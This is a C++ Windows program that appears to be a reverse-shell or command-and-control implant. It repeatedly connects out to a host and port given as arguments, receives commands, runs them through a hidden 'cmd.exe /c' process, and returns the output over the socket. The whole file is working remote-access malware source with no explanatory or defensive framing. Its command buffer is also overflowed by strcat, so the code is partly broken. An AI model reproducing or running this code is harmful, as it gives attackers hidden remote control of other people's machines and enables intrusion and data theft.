
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

using namespace std;

int RunShell(char *host, int port)
{
  while (true)
  {
    Sleep(5000);
    SOCKET ShellSock;
    sockaddr_in C2addr;
    WSADATA Sockver = { 0 };
    WSAStartup(MAKEWORD(2, 2), &Sockver);
    ShellSock = socket(
      AF_INET, 
      SOCK_STREAM, 
      IPPROTO_TCP 
    );
    C2addr.sin_family = AF_INET;
    C2addr.sin_addr.S_un.S_addr = inet_addr(host);
    C2addr.sin_port = htons(port);
    if (WSAConnect(ShellSock, (SOCKADDR*)&C2addr, sizeof(C2addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
      closesocket(ShellSock);
      WSACleanup();
      continue;
    }
    else
    {
      char RecvData[DEFAULT_BUFLEN];
      memset(RecvData, 0, sizeof(RecvData));
      int RecvCode = recv(ShellSock, RecvData, DEFAULT_BUFLEN, 0);
      if (RecvCode<=0) {
        closesocket(ShellSock);
        WSACleanup();
        continue;
      }
      else
      {
        HANDLE hReadPipe = NULL;
        HANDLE hWritePipe = NULL;
        SECURITY_ATTRIBUTES securityAttributes = { 0 };
        BOOL bRet = FALSE;
        STARTUPINFO si = { 0 };
        char command[] = "cmd.exe /c ";
        PROCESS_INFORMATION pi = { 0 };
        char pszResultBuffer[DEFAULT_BUFLEN];
        securityAttributes.bInheritHandle = TRUE;
        securityAttributes.nLength = sizeof(securityAttributes);
        securityAttributes.lpSecurityDescriptor = NULL;
        bRet = ::CreatePipe(&hReadPipe, &hWritePipe, &securityAttributes, 0);
        si.cb = sizeof(si);
        si.hStdError = hWritePipe;
        si.hStdOutput = hWritePipe;
        si.wShowWindow = SW_HIDE;
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        strcat(command, RecvData);
        bRet = ::CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        ::WaitForSingleObject(pi.hThread, INFINITE);
        ::WaitForSingleObject(pi.hProcess, INFINITE);
        memset(pszResultBuffer, 0, sizeof(pszResultBuffer));
        ::ReadFile(hReadPipe, pszResultBuffer, DEFAULT_BUFLEN, NULL, NULL);
        ::CloseHandle(pi.hThread);
        ::CloseHandle(pi.hProcess);
        ::CloseHandle(hWritePipe);
        ::CloseHandle(hReadPipe);
        send(ShellSock, pszResultBuffer, DEFAULT_BUFLEN, 0);
      }
    }

  }
}

int main(int argc, char** argv) {
  int port = atoi(argv[2]);
  RunShell(argv[1],port);
}